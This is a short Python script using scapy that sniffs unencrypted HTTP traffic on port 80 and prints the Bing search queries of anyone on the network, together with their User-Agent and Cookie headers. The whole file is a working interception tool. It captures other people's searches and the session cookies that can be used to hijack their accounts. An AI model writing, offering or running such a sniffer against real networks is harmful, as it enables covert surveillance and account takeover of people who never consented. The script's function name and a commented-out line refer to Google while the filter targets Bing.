import re
from scapy.all import *


def find_google(pkt):
    if pkt.haslayer(Raw):
        payload = pkt.getlayer(Raw).load
        if 'GET' in payload:
            if 'bing' in payload:
                # r = re.findall(r'(?i)\&q=(.*?)\&', payload)  # google
                r = re.findall(r'(?i)\?q=(.*?)\&', payload)  # bing
                user_agent_r = re.findall('(?i)User-Agent: (.*?)\r\n', payload)
                cookie_r = re.findall('(?i)Cookie: (.*?)\r\n', payload)
                if r:
                    search = r[0].split('&')[0]
                    user_agent = user_agent_r[0]
                    cookie = cookie_r[0]
                    search = search.replace('q=', '').replace('+', ' ').replace('%20', ' ')
                    print('[+] Searched for: %s with User-Agent: %s and Cookie: %s' % (search, user_agent, cookie))


def main():
    conf.iface = 'eth0'
    try:
        print('[+] Starting Bing Sniffer')
        sniff(filter='tcp port 80', prn=find_google)
    except KeyboardInterrupt:
        exit(0)


if __name__ == '__main__':
    main()
